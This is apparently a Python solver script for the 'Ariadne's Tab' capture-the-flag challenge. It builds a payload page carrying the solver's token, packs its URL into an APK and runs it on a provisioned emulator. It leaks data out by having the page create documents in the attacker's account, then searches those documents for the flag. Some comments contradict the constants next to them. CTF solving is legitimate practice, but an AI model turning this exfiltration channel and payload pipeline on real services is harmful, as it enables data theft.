#!/usr/bin/env python3
"""
One scripted shot at Ariadne's Tab.

An android.koth.pro session gives the submitted APK roughly 55 seconds of
emulator runtime after about 140 seconds of provisioning, and the render
capability baked into the payload URL expires 60 minutes after it's issued.
So every step from "mint a fresh capability" to "read the telemetry back"
has to run unattended, in order, from one command.

    shot.py build            refresh the payload and rebuild recon.apk only
    shot.py fire  [tag]      build, provision, stream logs, then dump telemetry
    shot.py read  [tag]      re-read the page telemetry for a tag

The page can't write to logcat, so it exfiltrates by creating documents in
OUR OWN account whose `name` carries the line. `read` pulls those back with
documents/list and prints them in order.
"""

import json
import os
import re
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

import ari  # noqa: E402
import androidkoth  # noqa: E402
import docs  # noqa: E402

CHALLENGE = "Ariadne's Tab"
APK = os.path.join(HERE, "recon.apk")
PAYLOAD_JAVA = os.path.join(
    HERE, "recon", "src", "xyz", "ariadnetab", "solver", "Payload.java"
)


CANDIDATES = os.path.join(HERE, "candidates_wide.txt")

# A session is ~55 s. MainActivity seeds localStorage for the first 12 s, so the
# page gets ~43 s. Every probe costs at least 8 s: loadEncodedKeys waits out the
# whole waitForNativeChannel timeout before falling back to the stored keypair.
# budget = lanes * floor(43 / (deadline/1000)). Observed: a hit resolves in
# ~8.6 s here, a miss costs the full deadline. 13 s leaves headroom on a slower
# emulator. 10 lanes, not 16, since each lane is a full app.js boot.
LANES = 6
DEADLINE_MS = 12000
BUDGET = 40


def java_string(value):
    """Escape a URL for a Java string literal."""
    return '"' + value.replace("\\", "\\\\").replace('"', '\\"') + '"'


def load_targets(limit=BUDGET):
    """Ordered candidate ids, comments and blanks stripped."""
    if not os.path.exists(CANDIDATES):
        return []
    out = []
    with open(CANDIDATES) as handle:
        for line in handle:
            line = line.split("#")[0].strip()
            if line:
                out.append(line)
    return out[:limit]


def build(tag, targets=None):
    """Mint a fresh payload document, wire its viewer URL in, and rebuild."""
    state = ari.load_state()
    state["access_token"] = ari.get_token(state["email"], state["password"])["access_token"]
    ari.save_state(state)

    if targets is None:
        targets = load_targets()
    if os.environ.get("CTF_TARGET"):
        targets = [t.strip() for t in os.environ["CTF_TARGET"].split(",") if t.strip()]

    with open(os.path.join(HERE, "payload.html")) as handle:
        html = handle.read()
    html = (html
            .replace("@@TOKEN@@", state["access_token"])
            .replace("@@TAG@@", tag)
            .replace("@@TARGETS@@", json.dumps(targets))
            .replace("@@LANES@@", str(LANES))
            .replace("@@DEADLINE@@", str(DEADLINE_MS)))
    for marker in ("@@TOKEN@@", "@@TAG@@", "@@TARGETS@@", "@@LANES@@", "@@DEADLINE@@"):
        if marker in html:
            raise SystemExit("payload.html still contains %s after substitution" % marker)
    print("targets=%d lanes=%d deadline=%dms" % (len(targets), LANES, DEADLINE_MS))

    summary, _ = docs.upload(state, "payload-%s.html" % tag, "text/html", html.encode())
    url = docs.viewer_url(state, summary["id"])
    state.update(payload_id=summary["id"], payload_url=url, tag=tag)
    ari.save_state(state)

    with open(PAYLOAD_JAVA, "w") as handle:
        handle.write(
            "package xyz.ariadnetab.solver;\n\n"
            "/** Generated by shot.py. The capability inside expires 60 minutes"
            " after it was issued. */\npublic final class Payload {\n"
            "    public static final String URL = %s;\n"
            "    private Payload() {}\n}\n" % java_string(url)
        )

    subprocess.run(
        [os.path.join(HERE, "build.sh"), os.path.join(HERE, "recon")],
        check=True,
        cwd=HERE,
    )
    print("tag=%s payload=%s" % (tag, summary["id"]))
    return state


def provision_with_retry(attempts=5):
    """Roughly one provision in three never gets an emulator and finishes with
    status `timeout` after 180 s, and a refused provision means the 15-minute
    per-team quota has not elapsed. Both are worth waiting out unattended,
    because the payload capability only lives 60 minutes."""
    form, ctype = androidkoth.multipart({"challenge": CHALLENGE}, {"file": APK})
    for attempt in range(attempts):
        status, body = androidkoth.call("/provision", "POST", form, ctype)
        print("provision attempt %d -> %s %s" % (attempt, status, body), flush=True)
        if status == 200 and isinstance(body, dict) and body.get("session_id"):
            return body["session_id"]
        time.sleep(120)
    raise SystemExit("provision never accepted")


def poll_telemetry(tag, token, seen):
    """Page telemetry, read WHILE the session runs.

    Android Chrome does fire the `arix://` beacon (session t11 proved it), but
    from a top-level navigation it also commits away and destroys the page, so
    the beacon is now a best-effort iframe side channel only. The document
    channel is the channel that must work, and the way to make it live is to
    poll it DURING the run instead of after.
    The page creates one document per line in OUR OWN account, the run is ~55 s,
    and documents/list is a single cheap POST, so a few seconds of polling turns
    a blind session into a running commentary.
    """
    pattern = re.compile(r"^" + re.escape(tag) + r"r(\d+)\|(\d+)\|")
    try:
        status, listing, _ = ari.api("documents/list", token, {})
    except Exception as error:
        print("  [telemetry] %s" % error, flush=True)
        return
    if status != 200 or not isinstance(listing, list):
        return
    rows = []
    for item in listing:
        name = item.get("name") or ""
        m = pattern.match(name)
        if m and name not in seen:
            seen.add(name)
            rows.append((int(m.group(1)), int(m.group(2)), name))
    for _run, _seq, name in sorted(rows):
        print("  [page] %s" % name, flush=True)


def fire(tag):
    state = build(tag)
    token = state["access_token"]
    session = provision_with_retry()
    print("session", session, flush=True)

    seen = set()
    page_seen = set()
    deadline = time.time() + 420
    last_poll = 0.0
    while time.time() < deadline:
        code, payload = androidkoth.call("/session/%s/logs" % session)
        for line in reversed(payload.get("logs", []) if isinstance(payload, dict) else []):
            if line not in seen:
                seen.add(line)
                print(line, flush=True)
        # Only start polling once the emulator is actually running the APK;
        # before that there's nothing to see and it just burns requests.
        if any("Runtime limit" in line or "solver start" in line or "Run " in line
               for line in seen) and time.time() - last_poll > 5:
            last_poll = time.time()
            poll_telemetry(tag, token, page_seen)
        if any("Runtime limit reached" in line or "Run failed" in line for line in seen):
            break
        time.sleep(4)
    # one final sweep, the last few lines land after the runtime ends
    time.sleep(6)
    poll_telemetry(tag, token, page_seen)
    return session


def read(tag):
    """Pull the page's telemetry back out of our own document list.

    The page names each line `<tag>r<RUN>|<seq>|<ms>|<message>`, because
    payload.html builds its own tag as `@@TAG@@ + "r" + RUN` so that two
    tabs in one session stay apart. An earlier version of this function
    filtered on `tag + "|"`, which never matches, so every run before
    this fix printed empty even though the documents were there.
    """
    state = ari.load_state()
    state["access_token"] = ari.get_token(state["email"], state["password"])["access_token"]
    ari.save_state(state)
    status, listing, _ = ari.api("documents/list", state["access_token"], {})
    if status != 200:
        raise SystemExit("documents/list %s %s" % (status, listing))

    pattern = re.compile(r"^" + re.escape(tag) + r"r(\d+)\|(\d+)\|")
    rows = []
    for item in listing:
        name = item.get("name") or ""
        m = pattern.match(name)
        if m:
            rows.append((int(m.group(1)), int(m.group(2)), name))
    rows.sort()

    run = None
    for r, _seq, name in rows:
        if r != run:
            run = r
            print("--- run r%d ---" % r)
        print(name)
    if not rows:
        print("no telemetry for tag %r (%d documents in account)"
              % (tag, len(listing)))

    blob = "\n".join(name for _r, _s, name in rows)
    flag = re.search(r"TFCCTF\{[^}]*\}", blob)
    if flag:
        print("FLAG", flag.group())
    return [name for _r, _s, name in rows]


if __name__ == "__main__":
    action = sys.argv[1] if len(sys.argv) > 1 else "build"
    label = sys.argv[2] if len(sys.argv) > 2 else "s%d" % (int(time.time()) % 10000)
    if action == "build":
        build(label)
    elif action == "fire":
        fire(label)
        print("--- page telemetry ---")
        read(label)
    elif action == "read":
        read(label)
    else:
        raise SystemExit(__doc__)
